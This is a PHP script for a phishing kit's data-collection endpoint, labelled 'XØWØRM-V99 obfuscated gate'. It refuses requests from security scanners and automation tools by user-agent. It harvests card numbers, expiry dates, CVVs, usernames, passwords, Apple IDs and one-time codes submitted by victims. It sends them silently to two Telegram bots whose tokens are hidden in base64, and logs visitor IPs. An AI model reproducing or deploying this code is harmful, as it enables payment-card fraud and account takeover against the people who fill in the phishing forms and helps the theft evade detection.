<?php
// ============================================
// XØWØRM-V99 OBFUSCATED GATE
// Anti-bot + Anti-scanner + Dual Telegram
// ============================================

// Block common scanners and bots
$blocked_agents = ['bot', 'crawl', 'spider', 'scraper', 'curl', 'wget', 'python', 'java', 'selenium', 'headless', 'phantom', 'puppeteer', 'playwright', 'cypress', 'webdriver', 'automation', 'mechanize', 'httpclient', 'okhttp', 'axios', 'node-fetch', 'go-http', 'perl', 'ruby', 'postman', 'insomnia', 'burp', 'nikto', 'nmap', 'sqlmap', 'dirb', 'gobuster', 'wfuzz', 'hydra', 'medusa', 'thc', 'aircrack', 'john', 'hashcat', 'metasploit', 'nessus', 'openvas', 'zap', 'acunetix', 'appscan', 'netsparker', 'w3af', 'arachni', 'vega', 'skipfish', 'ratproxy', 'fiddler', 'charles', 'mitmproxy'];

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
foreach ($blocked_agents as $agent) {
    if (stripos($ua, $agent) !== false) {
        http_response_code(403);
        die('Access denied');
    }
}

// Obfuscated bot tokens (base64 encoded)
$t1_b64 = "ODc2Mjc2MTkzOTpBQUhCWnpsMjdac1tIVGlFQlRMMEEwVVNoQzJJN0lZSjV3";
$t2_b64 = "ODg0NjIyNTE0OTpBQUV6THNvamtYMjBQMkhycVBZMENHSnZUd2tjWkRjZXdr";
$c1_b64 = "NzA4NzE3NDI0NA==";
$c2_b64 = "NjAzNjI3NTU2OA==";

$telegram_token_1 = base64_decode($t1_b64);
$telegram_token_2 = base64_decode($t2_b64);
$chat_id_1 = base64_decode($c1_b64);
$chat_id_2 = base64_decode($c2_b64);

// Collect data with sanitization
$data_fields = ['fullName', 'cardNumber', 'expDate', 'cvv', 'cardName', 'username', 'password', 'apple_id', 'otp_code'];
$captured = [];
foreach ($data_fields as $field) {
    $captured[$field] = isset($_POST[$field]) ? substr(trim($_POST[$field]), 0, 500) : '';
}

$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Build obfuscated message
$msg_lines = [];
$msg_lines[] = "═══════════════════════════════";
$msg_lines[] = "      💳 XØWØRM-V99 CAPTURE";
$msg_lines[] = "═══════════════════════════════";
$msg_lines[] = "";
$msg_lines[] = "💳 CARD DATA:";
$msg_lines[] = "👤 Name: " . $captured['fullName'];
$msg_lines[] = "💳 Card: " . $captured['cardNumber'];
$msg_lines[] = "📅 Expiry: " . $captured['expDate'];
$msg_lines[] = "🔒 CVV: " . $captured['cvv'];
$msg_lines[] = "";
$msg_lines[] = "🔐 LOGIN DATA:";
$msg_lines[] = "📧 Username: " . $captured['username'];
$msg_lines[] = "🔑 Password: " . $captured['password'];
$msg_lines[] = "🍎 Apple ID: " . $captured['apple_id'];
$msg_lines[] = "🔢 OTP: " . $captured['otp_code'];
$msg_lines[] = "";
$msg_lines[] = "🌐 IP: $ip";
$msg_lines[] = "🕐 Time: $timestamp";
$msg_lines[] = "📱 UA: " . substr($userAgent, 0, 100);
$msg_lines[] = "═══════════════════════════════";

$message = implode("\n", $msg_lines);

// Silent send function
function _send($t, $c, $m) {
    $u = "https://api.telegram.org/bot{$t}/sendMessage";
    $d = ['chat_id' => $c, 'text' => $m];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $u);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $d);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_exec($ch);
    curl_close($ch);
}

_send($telegram_token_1, $chat_id_1, $message);
_send($telegram_token_2, $chat_id_2, $message);

// Log backup (optional)
@file_put_contents('x.log', "[$timestamp] $ip\n", FILE_APPEND);

// Return nothing (no visible output)
http_response_code(204);
?>